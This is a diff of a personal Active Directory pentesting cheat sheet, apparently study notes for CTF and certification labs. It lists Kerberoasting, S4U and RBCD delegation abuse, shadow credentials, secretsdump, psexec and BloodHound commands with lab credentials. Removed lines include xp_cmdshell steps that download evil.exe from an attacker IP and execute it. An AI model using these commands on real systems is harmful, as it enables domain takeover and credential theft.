@@ -10,8 +10,11 @@
 | [PingCastle](https://www.pingcastle.com/documentation/)<br><br>                                                                                   | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                                   |
 | [Group3r](https://github.com/Group3r/Group3r)                                                                                                     | finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
 | Power Hunt Shares                                                                                                                                 | Find a file shares                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
-|                                                                                                                                                   |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
-|                                                                                                                                                   |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| <br>[ADRecon](https://github.com/adrecon/ADRecon)                                                                                                 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| [AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)                                                                 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| [Power Hunt Shares](https://github.com/NetSPI/PowerHuntShares)                                                                                    |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| Certipy                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| targetedKerberoast                                                                                                                                |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
 
 
 
@@ -22,13 +25,29 @@ nltest /dclist:AD.it
 ```
 
 **Rubeus**
+
 ```powershell
+
+#usually 
+#ask for a tgt
+#add /ptt to store the ticket in the session
+ ./rubeus.exe  asktgt /user:fsmith /password:Thestrokes23 /domain:EGOTISTICAL-BANK.LOCAL /dc:SAUNA.EGOTISTICAL-BANK.LOCAL /nowrap 
+
+
+#@@@@ when we authticate using nrml session like username pass in evilwinrm  NOT KERBEROS meanig  non TGT session in memory @@@@
+
+# /nowrap is purely for formatting
 
 #Request a spn ticket
  .\Rubeus.exe kerberoast  /outfile:hashes.kerberoast
  
  #s4u 
  .\Rubeus.exe s4u /user:AttackerPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:HOST/TARGETPC.domain.local /ptt
+ 
+ 
+#calculate the hash for us reutrn rc4 ....
+Rubeus.exe hash /password:password123 /user:fak$ /domain:authority.htb
+
 ```
 
  **Impacket**
@@ -41,7 +60,8 @@ impacket-wmiexec  access.offsec/svc_mssql:trustno1@192.168.133.187
 impacket-psexec  access.offsec/svc_mssql:trustno1@192.168.133.187  
 
 #add Computer 
-impacket-addcomputer -computer-name 'TEST$' -computer-pass 'AttackerPC1!' -dc-ip 192.168.223.175 -dc-host RESOURCED.LOCAL 'resourced.local/l.livingstone' -hashes ":19a3a7550ce8c505c2d46b5e39d6f808"
+addcomputer.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name 'fak$' -computer-pass 'password123' -dc-ip 10.129.229.56
+
 
 #RBCD
  impacket-rbcd -dc-ip 192.168.223.175 -delegate-from 'TEST$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 
@@ -49,6 +69,42 @@ impacket-addcomputer -computer-name 'TEST$' -computer-pass 'AttackerPC1!' -dc-ip
 #List AD computers  
 impacket-GetADComputers  -dc-ip 192.168.223.175  resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 
 
+#dump secrets from system and sam locally
+secretsdump.py -system system -sam sam LOCAL
+
+# MSSSQL
+mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.129.45.139 
+mssqlclient.py -k -no-pass  dc1.scrm.local
+
+
+#query Active Directory (AD) for user information from a domain controller
+
+GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
+
+# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords
+
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
+
+#Common Service Types for Tickets :
+#cifs = File sharing (SMB)
+#ldap = Active Directory access
+#HTTP = Web services
+#HOST = General host access
+#DNS = DNS services
+
+#Full SID list with the smae Domain ID of the user 
+lookupsid.py SEQUEL.HTB/ryan:'WqSZAF6CysDQbGb3'@10.129.45.247
+
+#request TGT 
+getTGT.py scrm.local/ksimpson:ksimpson -dc-ip 10.129.41.191
+
+#export the ticket here to able to use it in most tools uing -k
+export KRB5CCNAME=ksimpson.ccache
+
+#USE DOMAIN NAME with kerberos NOT IP
+smbclient.py  -k -no-pass ksimpson@dc1.scrm.local
+
+ 
 ```
 
 **Powershell**
@@ -115,11 +171,14 @@ get-DomainGroup -Identity "Domain Admins"
 #enum members of group
 get-domainGroupMember -Identity "Domain Admins"
 
+# Set Owner ACL to an object 
+Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
 
-#ACL for a Group
+#Adds an ACL for a specific active directory object.
 Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
-#ACL for a user
-Get-DomainObjectAcl -Identity "student473" -ResolveGUIDs -Verbose
+
+#Give ACL permission to a target 
+Add-DomainObjectAcl  -TargetIdentity ca_svc -Rights All
  
 #Intersting ACL 
 Find-InterestingDomainAcl
@@ -131,8 +190,10 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "stu
 #trust
 
 
-#SPN ticket 
+#request a kerberos ticket  TGS for the given SPN 
+#sometimes for some reason we need to insert a cred powershell 
 get-DomainSPNTicket -SPN "MSSQLSvc/DC.access.offsec"
+Get-DomainSPNTicket -Credential $Cred -SPN nonexistent/BLAHBLAH 
 
 #users wit SPN set 
 get-DomainUser -SPN
@@ -162,32 +223,14 @@ Invoke-AllChecks
 ```
 
 
-### LDAP
-**Lightweight Directory Access Protocol (LDAP) directories**. It allows you to search and retrieve information from an **Active Directory (AD) or LDAP server**, such as **users, groups, computers, and other directory objects**.
+ 
+ **Kerbrute**
+
+Kerberos pre-auth to test a userlist against the DC and tells you which accounts actually exist adds automatically the domain in the wordlist
+
 
 ```sh
-
-#enum with username
-ldapsearch -x -H ldap://192.168.121.122 -D 'Domain\username' -b "DC=hutch,DC=offsec0" "(objectClass=*)" 
-#`objectClass` is an attribute that defines what kind of object it is (user, group, computer, organizationalUnit, etc.).
-
-#usernames
-ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectclass=*)" | grep sAMAccountName:
-
-#read laps pass
-nxc ldap 192.168.104.122 -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --module laps                                              
-nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
-
-nxc ldap 10.10.11.35 -u '' -p '' --users 
-```
-### Kerbrute
-
-after obtainng some samAccountName "username" we can use this account to check if pre-auth is off for any users if pre-auth is disable we may be able to **kerberoast** for domain credentials
-
-
-```
-kerbrute -domain hutch.offsec -dc-ip 192.168.121.122 -user username
-
+kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.40.182  username.txt
 ```
 
 >brute force for username using kerbrute
@@ -195,49 +238,44 @@ kerbrute -domain hutch.offsec -dc-ip 192.168.121.122 -user username
 kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  -t 100
 ```
 
-### Impacket
+**evil-winrm**
+
 
 ```sh
-#query Active Directory (AD) for user information from a domain controller
 
-GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
 
-# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords
+#@@@@@@@@@@@@@      kerberos 
+#before we need to  is the config file for the Kerberos client on your machineconfig file for the Kerberos client on your machine  `etc/krb5.conf` since it needs sit reads this file to know **where to send Kerberos requests** 
+evil-winrm -i 10.129.41.191 -u MiscSvc -K ./MiscSvc.ccache -r scrm.local
 
-GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
-```
+#example of config kerberos in etc/krb5.config
+#add
+[libdefaults]
+    default_realm = SCRM.LOCAL
+    dns_lookup_kdc = false
 
-**mssqlclient**
-```sh
+[realms]
+    SCRM.LOCAL = {
+        kdc = dc1.scrm.local
+    }
 
-#sql service account tgs
+[domain_realm]
+    .scrm.local = SCRM.LOCAL
+    scrm.local = SCRM.LOCAL
 
-impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.107.148 -windows-auth
-
-enable_xp_cmdshell
-
-#find a dir to write on
-
-xp_cmdshell dir c:\users\public\document
-
-xp_cmdshell curl http://10.10.10.10/evil.exe  -o c:\users\public\document\evil.exe 
-
-xp_cmdshell  c:\users\public\document\evil.exe 
-
-#or use printspoofer or so to basically change the admin passowrd 
-printspoofer -i -c "net user administrator password123"
-#disable wifewall enable rdp 
 
 
 ```
 
 
+ **Bloodhound**
 
-#### Bloodhound
-
-**BloodHound Legacy (To be done only after getting admin privileges)**
+BloodHound Legacy (To be done only after getting admin privileges)
 
 BloodHound uses neo4j graph database, so that needs to be set up first.
+
+
+> Method manual
 
 We need to install the neo4j service. Unzip the archive C:\AD\Tools\neo4j-community-4.1.1-windows.zip 
 
@@ -251,15 +289,25 @@ neo4j.bat install-service
 neo4j.bat start
 ```
 
-**Issue with Local Admin and BloodHound Legacy**
+Issue with Local Admin and BloodHound Legacy -> BloodHound legacy does not show Local Admin edge in GUI. The last version where it worked was 4.0.3.
 
-BloodHound legacy does not show Local Admin edge in GUI. The last version where it worked was 4.0.3.
 
-upload  sharphound into the target machine
+>Method docker automated 
 
+```sh
+#first time 
+./bloodhound-cli install 
+
+#usually
+./bloodhound-cli start
+```
+
+Execute an Injestor  into the target machine
 ```powershell
-#ingestors
+#NXC
+nxc ldap dc01.sequel.htb -u {USER} -p {Password} --bloodhound --collection All --dns-server {DNS}
 
+#Sharphound
 SharpHound.exe --CollectionMethods All --Domain <domainname> --DomainController <DCAddress> --LdapUsername <user> --LdapPassword <password> --ZipFileName contoso_sharphound_ldap.zip --OutputDirectory C:\Temp\SharphoundOutput
 
 ./sharphound.exe --CollectionMethod All 
@@ -268,17 +316,27 @@ sharphound.exe -c all -d active.htb --domaincontroller 10.10.10.10
 
 #stealthier 
 C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs
+
+SharpHound.exe --CollectionMethods All           # Full sweep (noisy)
+SharpHound.exe --CollectionMethods Group,LocalAdmin,Session,Trusts,ACL
+SharpHound.exe --Stealth --LDAP                      # Low noise LDAP only
+
+#Bloodhound Legacy  injestor 
+#upload first the Sharphound.ps1 in PS
+Invoke-BloodHound
+
+#Python Based injestor  remote 
+bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c
+all --zip
+#using a kerberos ticket
+bloodhound-python -k -no-pass -d scrm.local -dc dc1.scrm.local -c all --auth-method kerberos -u ksimpson  -ns 10.129.41.191
+
+
 ```
 
 - then we will see bloodhound.zip file
-
-
-```
-neo4j start
-```
-
-- upload the zip file inside the neo4j server 
-- search for a specific user like svc_tgs or known username if not go to search pre-build queries  and  click on shortest path from kerberostable users 
+- upload the zip file inside the neo4j server  or bloodhound
+- search for a specific known user if not go to search pre-build queries  and  click on shortest path from kerberostable users 
 
 >Dump Remotely from the kali connecting remotely to the machine
 ```
@@ -286,20 +344,9 @@ bloodhound-python -u [usename] -p [password] -ns $ip  -d [domain] -c all
 ```
 
 
-```sh
-# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords
 
-GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
-```
 
-Common Service Types for Tickets :
-
-- **`cifs`** = File sharing (SMB)
-- **`ldap`** = Active Directory access
-- **`HTTP`** = Web services
-- **`HOST`** = General host access
-- **`DNS`** = DNS services
-#### LMNR Poisoning  
+**responder**
 
 LMNR for capturing hashes 
 ```
@@ -310,24 +357,27 @@ https://github.com/Greenwolf/ntlm_theft
 
 
 
-### PingCastle
+ **PingCastle**
+
+performs a **health-check** of Active Directory and generates an HTML report with risk scoring.
+
 
 ```powershell
 PingCastle.exe --healthcheck --server corp.local --user bob --password "P@ssw0rd!"
 ```
 
 
+**ADExplorer**
 
-[AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) (Sysinternals) is an advanced **AD viewer & editor** which allows:
+(Sysinternals) is an advanced **AD viewer & editor** which allows:
 
 - GUI browsing of the directory tree
 - Editing of object attributes & security descriptors
 - Snapshot creation / comparison for offline analysis
 
 
-### ADRecon
-
-[ADRecon](https://github.com/adrecon/ADRecon) extracts a large set of artefacts from a domain (ACLs, GPOs, trusts, CA templates …) and produces an **Excel report**.
+ **ADRecon**
+ extracts a large set of artifacts from a domain (ACLs, GPOs, trusts, CA templates …) and produces an **Excel report**.
 
 powershell
 
@@ -337,41 +387,9 @@ PS C:\> .\ADRecon.ps1 -OutputDir C:\Temp\ADRecon
 ```
 
 
-### BloodHound  graph visualisation
+ **Enum4Linux**
 
-[BloodHound](https://github.com/BloodHoundAD/BloodHound) uses graph theory + Neo4j to reveal hidden privilege relationships inside on-prem AD & Azure AD.
-
-
-### [Collectors](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/bloodhound.html#collectors)
-
-- `SharpHound.exe` / `Invoke-BloodHound` – native or PowerShell variant
-- `AzureHound` – Azure AD enumeration
-- **SoaPy + BOFHound** – ADWS collection (see link at top)
-
-powershell
-
-```powershell
-SharpHound.exe --CollectionMethods All           # Full sweep (noisy)
-SharpHound.exe --CollectionMethods Group,LocalAdmin,Session,Trusts,ACL
-SharpHound.exe --Stealth --LDAP                      # Low noise LDAP only
-```
-
-The collectors generate JSON which is ingested via the BloodHound GUI.
-
-
-### PingCastle
-
-[PingCastle](https://www.pingcastle.com/documentation/) performs a **health-check** of Active Directory and generates an HTML report with risk scoring.
-
-powershell
-
-```powershell
-PingCastle.exe --healthcheck --server corp.local --user bob --password "P@ssw0rd!"
-```
-
-
-
-### Enum4Linux
+Enum4linux helps you find details about a Windows machine, such as users, groups, shared folders, and other network information, by asking the Windows file-sharing service (SMB) questions.
 
 ```sh
 #-a Do all simple enumeration (-U -S -G -P -r -o -n -i).
@@ -379,3 +397,46 @@ PingCastle.exe --healthcheck --server corp.local --user bob --password "P@ssw0rd
 enum4linux -a $IP 
 
 ```
+
+
+**Certipy** 
+
+```sh
+#Shadow Credentials
+#attacker abuses the `msDS-KeyCredentialLink` attribute to add their own certificate-based authentication method to another AD account
+
+certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
+
+
+#if you only have the cert, use it to request a TGT (PKINIT), then run bloodhound-python with that ticket
+certipy auth -pfx legacyy_dev_auth.pfx -dc-ip <dc-ip>
+
+```
+
+
+**nxc**
+
+```sh
+nxc ldap 10.129.38.148 -u support -p 'Ironside47pleasure40Watchful' --bloodhound -c All --dns-server 10.129.38.148
+
+#You hand the tool the password and `-k`, and it requests the TGT itself, in-memory, then uses it
+nxc smb <DOMAIn> -u ksimpson -p 'password' -k
+
+#using kerberos and injected ticket to enum 
+nxc smb 10.129.41.191 -k --use-kcache
+
+```
+
+
+**targetedKerberoast**
+
+ a Python script that can, like many others (e.g. [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)), print "kerberoast" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the `servicePrincipalName` attribute), print the "kerberoast" hash, and delete the temporary SPN set for that operation.
+
+```sh
+python3 targetedKerberoast.py -v -d administrator.htb -u olivia -p 'ichliebedich'
+```
+
+
+Check references 
+
+https://netwerklabs.com/powerview-cheat-sheet/
